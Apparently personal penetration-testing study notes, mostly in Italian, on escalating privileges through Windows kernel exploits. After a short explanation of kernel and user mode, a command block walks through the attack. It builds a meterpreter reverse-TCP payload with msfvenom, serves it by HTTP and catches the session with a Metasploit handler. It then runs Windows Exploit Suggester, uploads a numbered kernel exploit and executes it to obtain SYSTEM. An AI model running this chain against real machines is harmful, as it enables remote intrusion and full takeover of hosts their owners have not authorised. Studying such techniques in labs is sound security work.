Un kernel è un programma per computer che costituisce il nucleo di un sistema operativo e ha il controllo completo su ogni risorsa e hardware di un sistema. 
Funziona come uno strato di traduzione tra hardware e software e facilita la comunicazione tra questi due strati. 

Windows NT è il kernel preconfezionato con tutte le versioni di Microsoft Windows e funziona come un kernel tradizionale con alcune eccezioni basate sulla filosofia di progettazione dell'utente. È costituito da due modalità operative principali che determinano l'accesso alle risorse e all'hardware del sistema:
- Modalità utente: i programmi e i servizi eseguiti in modalità utente hanno accesso limitato alle risorse e alle funzionalità del sistema. 
- Modalità kernel: la modalità kernel offre accesso illimitato alle risorse e alle funzionalità del sistema con la funzionalità aggiuntiva di gestione dei dispositivi e della memoria di sistema.

Gli exploit del kernel su Windows in genere prendono di mira le vulnerabilità in
Kernel di Windows per eseguire codice arbitrario per eseguire il sistema privilegiato
comandi o per ottenere una shell di sistema.
● Questo processo varierà in base alla versione di Windows di destinazione e
l'exploit del kernel utilizzato.
● L'escalation dei privilegi sui sistemi Windows in genere segue quanto segue
metodologia:
+ Identificazione delle vulnerabilità del kernel
+ Download, compilazione e trasferimento degli exploit del kernel sul target
sistema.

Posso usare due tools per Exploit kernel:
1. Windows Exploit Suggester
2. Windows Kernel Exploit


```
# Se ho accesso all'host, posso creare un Payload con msfenom per creare una reverse shell e utilizzare Metasploit per ottenere una meterpreter session. 

>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=4444 -f exe -o payload.exe
> Start server python3 -m http.server
> Download payload.exe
> msfconsole
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST 192.168.31.128
> set LPORT 4444
> run
Got meterpreter session , run in it background


Another way - Use Windows Exploit Suggester

mkdir Windows-Exploit-Suggester cd Windows-Exploit-Suggester wget <https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py>

cd Windows-Exploit-Suggester python ./windows-exploit-suggester.py --update pip install xlrd --upgrade

Go to meterpreter session and upload an file

cd C:\\ mkdir temp cd temp\\

upload 41015.exe shell .\\41015.exe 7

Got system privilege :)
```